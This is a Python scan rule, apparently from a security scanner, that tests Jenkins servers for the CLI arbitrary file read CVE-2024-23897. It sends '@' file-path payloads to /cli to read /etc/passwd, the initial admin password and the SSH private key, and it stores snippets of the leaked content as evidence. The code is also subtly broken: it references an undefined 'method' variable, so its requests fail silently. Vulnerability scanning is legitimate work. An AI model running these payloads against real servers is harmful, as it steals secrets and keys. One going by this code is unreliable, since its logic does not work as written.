# Filename: VulnerabilityChecks/JenkinsCVE202423897ScanRule.py

import asyncio
import logging
import random
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, Set, TYPE_CHECKING

import aiohttp

if TYPE_CHECKING:
    from asyncio import Queue # For type hinting

@dataclass
class JenkinsCVE202423897Alert:
    cwe_id: int = 200
    wasc_id: int = 13
    name: str = "Jenkins CLI Arbitrary File Read (CVE-2024-23897)"
    description: str = (
        "Jenkins versions supporting the CLI command parser with the args4j library are vulnerable "
        "to an arbitrary file read (CVE-2024-23897). By default, arguments starting with '@' are "
        "interpreted as file paths and their content replaces the argument on the Jenkins controller. "
        "This can be exploited to read arbitrary files on the Jenkins controller file system."
    )
    uri: str = ""
    attack_details: Dict[str, Any] = field(default_factory=dict)
    evidence: str = ""
    other_info: str = ""
    solution: str = (
        "Upgrade Jenkins to version 2.442 or LTS 2.426.3, or later. "
        "Alternatively, disable the CLI over HTTP/Remoting access if not needed, or restrict its access. "
        "The system property `hudson.cli.CLICommand.allowAtSyntax` can be set to `false` on the controller "
        "to disable the @file expansion feature as a workaround."
    )
    reference: str = (
        "CVE-2024-23897\n"
        "Jenkins Security Advisory: https://www.jenkins.io/security/advisory/2024-01-24/\n"
        "Blog post (e.g., SonarSource): https://www.sonarsource.com/blog/cve-2024-23897-critical-jenkins-vulnerability-exploited/" # Corrected URL
    )
    risk: int = 4
    confidence: int = 3
    # Class level constant for confidence
    CONFIDENCE_HIGH: int = 3
    alert_tags: Dict[str, str] = field(default_factory=lambda: {
        "CVE": "CVE-2024-23897",
        "OWASP_2021_A01": "Broken Access Control",
        "OWASP_2021_A06": "Vulnerable and Outdated Components",
    })

    def as_dict(self) -> Dict[str, Any]:
        tags = self.alert_tags.copy()
        # CVE is already in default_factory, but ensure it's present
        tags["CVE"] = "CVE-2024-23897" 
        
        return {
            "vulnerability_type": "Jenkins_FileRead_CVE-2024-23897",
            "type": self.name,
            "detail": self.description,
            "payload_used": f"CLI Command: {self.attack_details.get('cli_command', 'N/A')} with @{self.attack_details.get('file_path', 'N/A')}",
            "injection_point_info": f"Jenkins CLI via HTTP {self.attack_details.get('method', 'N/A')} to {self.attack_details.get('cli_endpoint', '/cli')}",
            "url_tested": self.uri,
            "severity": {1: "Info", 2: "Low", 3: "Medium", 4: "High"}.get(self.risk, "Unknown"),
            "confidence": {1: "Low", 2: "Medium", 3: "High"}.get(self.confidence, "Unknown"),
            "evidence": self.evidence,
            "solution": self.solution,
            "reference": self.reference,
            "cwe_id": self.cwe_id,
            "wasc_id": self.wasc_id,
            "alert_tags": tags,
            "other_info": self.other_info
        }

CLI_HTTP_ENDPOINT = "/cli"
CLI_COMMAND_VEHICLES = ["help", "who-am-i", "version"]
FILES_TO_ATTEMPT_READ = [
    ("/etc/passwd", re.compile(rb"root:x:0:0"), "linux"),
    ("/var/jenkins_home/secrets/initialAdminPassword", re.compile(rb"^[0-9a-f]{32}$"), "linux"),
    ("/var/jenkins_home/.ssh/id_rsa", re.compile(rb"-----BEGIN ((RSA|OPENSSH|DSA|EC) )?PRIVATE KEY-----"), "linux"),
    ("C:\\Windows\\win.ini", re.compile(rb"\[fonts\]|\[extensions\]|\[files\]", re.IGNORECASE), "windows"),
    ("%JENKINS_HOME%/secrets/initialAdminPassword", re.compile(rb"^[0-9a-f]{32}$"), "windows"),
]

class JenkinsCVE202423897ScanRule:
    tech_required: Set[str] = {"Jenkins"}
    def __init__(self,
                 parent_logger: Optional[logging.Logger] = None,
                 http_timeout: float = 15.0,
                 active_scan_async_q: Optional['Queue'] = None # Added parameter
                 ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.http_timeout = http_timeout
        self.active_scan_async_q = active_scan_async_q # Store the queue

    async def _send_cli_request(
        self,
        session: aiohttp.ClientSession,
        jenkins_base_url: str,
        http_method: str,
        cli_command_str: Optional[str] = None,
        cli_command_parts: Optional[Dict[str, str]] = None,
        original_headers: Optional[Dict[str, str]] = None
    ) -> Tuple[Optional[str], int, Optional[Dict[str,str]]]:
        
        target_url = urllib.parse.urljoin(jenkins_base_url, CLI_HTTP_ENDPOINT.lstrip('/'))
        
        headers_to_send = (original_headers or {}).copy()
        if "User-Agent" not in headers_to_send:
             headers_to_send["User-Agent"] = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            ])

        params_for_get = None
        data_for_post = None

        if http_method.upper() == "GET" and cli_command_str:
            params_for_get = {"command": cli_command_str}
            self.logger.debug(f"Jenkins CVE-2024-23897: Sending GET to {target_url} with params {params_for_get}")
        elif http_method.upper() == "POST" and cli_command_parts:
            data_for_post = cli_command_parts
            # Check if Content-Type needs to be set, case-insensitively
            if not any(h.lower() == "content-type" for h in headers_to_send.keys()):
                 headers_to_send["Content-Type"] = "application/x-www-form-urlencoded"
            self.logger.debug(f"Jenkins CVE-2024-23897: Sending POST to {target_url} with data {data_for_post}")
        else:
            self.logger.error(f"Jenkins CVE-2024-23897: Invalid request setup for method {http_method}.")
            return None, -1, None
        
        text_content: Optional[str] = None
        status_code: int = -1
        response_headers: Optional[Dict[str,str]] = None

        try:
            timeout = aiohttp.ClientTimeout(total=self.http_timeout)
            async with session.request(
                method.upper(), target_url, headers=headers_to_send,
                params=params_for_get, data=data_for_post,
                timeout=timeout, allow_redirects=False, ssl=False
            ) as resp:
                response_bytes = await resp.read()
                try:
                    text_content = response_bytes.decode('utf-8', errors='surrogateescape')
                except UnicodeDecodeError:
                    text_content = response_bytes.decode('latin-1', errors='replace')
                
                status_code = resp.status
                response_headers = dict(resp.headers)
                self.logger.debug(f"Jenkins CVE-2024-23897: Response from {target_url} ({http_method}): Status {status_code}")
        except Exception as e:
            self.logger.warning(f"Jenkins CVE-2024-23897: Request to {target_url} ({http_method}) failed: {type(e).__name__} - {e}")
        
        return text_content, status_code, response_headers

    async def _check_cli_availability(
        self, session: aiohttp.ClientSession, jenkins_base_url: str, original_headers: Optional[Dict[str, str]]
    ) -> bool:
        cli_url = urllib.parse.urljoin(jenkins_base_url, CLI_HTTP_ENDPOINT.lstrip('/'))
        resp_text, status, headers = await self._send_cli_request(session, jenkins_base_url, "GET", cli_command_str="help", original_headers=original_headers)
        
        if status == 200:
            if resp_text and ("usage: java -jar jenkins-cli.jar" in resp_text.lower() or "commands are:" in resp_text.lower()):
                self.logger.info(f"Jenkins CVE-2024-23897: CLI endpoint {cli_url} appears active and responsive.")
                return True
            if headers and any(h.lower() == 'x-jenkins-cli' for h in headers.keys()):
                 self.logger.info(f"Jenkins CVE-2024-23897: CLI endpoint {cli_url} confirmed by X-Jenkins-CLI header.")
                 return True
            self.logger.debug(f"Jenkins CVE-2024-23897: CLI endpoint {cli_url} returned 200 but content not typical for CLI help. Proceeding cautiously.")
            return True
        elif status == 401 or status == 403:
             self.logger.info(f"Jenkins CVE-2024-23897: CLI endpoint {cli_url} requires authentication (Status {status}). Vulnerability might still apply.")
             return True
        elif status == 404:
            self.logger.info(f"Jenkins CVE-2024-23897: CLI endpoint {cli_url} not found (Status 404).")
            return False
        
        self.logger.debug(f"Jenkins CVE-2024-23897: CLI endpoint {cli_url} returned status {status}. Assuming unavailable/problematic.")
        return False

    async def _queue_alert(self, alert_instance: JenkinsCVE202423897Alert):
        if self.active_scan_async_q:
            try:
                await self.active_scan_async_q.put({"type": "active_scan_alert", "alert": alert_instance.as_dict()})
            except Exception as e_queue:
                self.logger.error(f"Failed to put Jenkins CVE-2024-23897 alert onto async queue: {e_queue}")
        else:
            self.logger.warning("active_scan_async_q not available in Jenkins CVE-2024-23897 rule, cannot queue alert.")

    async def scan(
        self,
        jenkins_base_url: str,
        original_headers: Dict[str, str],
        aiohttp_session: aiohttp.ClientSession,
        # The following are part of a more generic signature but less used by this specific rule
        original_cookies: Optional[Dict[str, str]] = None,
        page_specific_technologies: Optional[List[str]] = None,
        injection_details: Optional[Dict[str, Any]] = None,
        original_page_content_for_baseline_errors: Optional[str] = None
    ) -> None: # Changed return type to None
        
        if not self.active_scan_async_q:
            self.logger.warning("Jenkins CVE-2024-23897 scan skipped: active_scan_async_q not configured.")
            return

        if not jenkins_base_url.endswith('/'):
            jenkins_base_url += '/'
        
        self.logger.info(f"Starting Jenkins File Read (CVE-2024-23897) scan for: {jenkins_base_url}")

        if not await self._check_cli_availability(aiohttp_session, jenkins_base_url, original_headers):
            self.logger.info(f"Jenkins CVE-2024-23897: CLI over HTTP at {jenkins_base_url} seems unavailable or problematic. Skipping scan.")
            return

        alerts_generated_count = 0
        high_confidence_alert_found = False

        for file_path_to_read, content_pattern, _ in FILES_TO_ATTEMPT_READ:
            if high_confidence_alert_found:
                self.logger.info("Jenkins CVE-2024-23897: High confidence alert already found. Stopping further file read attempts.")
                break

            for cli_cmd_vehicle in CLI_COMMAND_VEHICLES:
                at_file_payload = f"@{file_path_to_read}"
                
                full_get_command_str = f"{cli_cmd_vehicle} {at_file_payload}"
                resp_text_get, status_get, _ = await self._send_cli_request(
                    aiohttp_session, jenkins_base_url, "GET",
                    cli_command_str=full_get_command_str,
                    original_headers=original_headers
                )
                if resp_text_get and content_pattern.search(resp_text_get.encode('utf-8', errors='ignore')):
                    self.logger.info(f"Jenkins CVE-2024-23897: CONFIRMED file read of '{file_path_to_read}' via GET using '{cli_cmd_vehicle}'.")
                    alert = JenkinsCVE202423897Alert(
                        uri=jenkins_base_url,
                        attack_details={
                            "file_path": file_path_to_read, "cli_command": cli_cmd_vehicle,
                            "method": "GET", "payload_arg": at_file_payload,
                            "cli_endpoint": CLI_HTTP_ENDPOINT
                        },
                        evidence=f"Content pattern for '{file_path_to_read}' found in response. Snippet: {resp_text_get[:300]}...",
                        other_info=f"File read: {file_path_to_read}. CLI command used: {full_get_command_str} (GET).",
                        confidence=JenkinsCVE202423897Alert.CONFIDENCE_HIGH
                    )
                    await self._queue_alert(alert)
                    alerts_generated_count += 1
                    high_confidence_alert_found = True
                    break 

                if high_confidence_alert_found: break

                post_command_parts = {"command": cli_cmd_vehicle, "arg": at_file_payload}
                resp_text_post, status_post, _ = await self._send_cli_request(
                    aiohttp_session, jenkins_base_url, "POST",
                    cli_command_parts=post_command_parts,
                    original_headers=original_headers
                )
                if resp_text_post and content_pattern.search(resp_text_post.encode('utf-8', errors='ignore')):
                    self.logger.info(f"Jenkins CVE-2024-23897: CONFIRMED file read of '{file_path_to_read}' via POST using '{cli_cmd_vehicle}'.")
                    alert = JenkinsCVE202423897Alert(
                        uri=jenkins_base_url,
                        attack_details={
                            "file_path": file_path_to_read, "cli_command": cli_cmd_vehicle,
                            "method": "POST", "payload_arg": at_file_payload,
                            "cli_endpoint": CLI_HTTP_ENDPOINT
                        },
                        evidence=f"Content pattern for '{file_path_to_read}' found in response. Snippet: {resp_text_post[:300]}...",
                        other_info=f"File read: {file_path_to_read}. CLI command used: {cli_cmd_vehicle} with arg {at_file_payload} (POST).",
                        confidence=JenkinsCVE202423897Alert.CONFIDENCE_HIGH
                    )
                    await self._queue_alert(alert)
                    alerts_generated_count += 1
                    high_confidence_alert_found = True
                    break
            
            if high_confidence_alert_found: # If found for this file, move to next file (or break outer if already set)
                continue

        if alerts_generated_count > 0:
            self.logger.info(f"Jenkins File Read (CVE-2024-23897) scan for {jenkins_base_url} completed. Found {alerts_generated_count} alerts.")
        else:
            self.logger.info(f"Jenkins File Read (CVE-2024-23897) scan for {jenkins_base_url} completed. No alerts generated.")
        return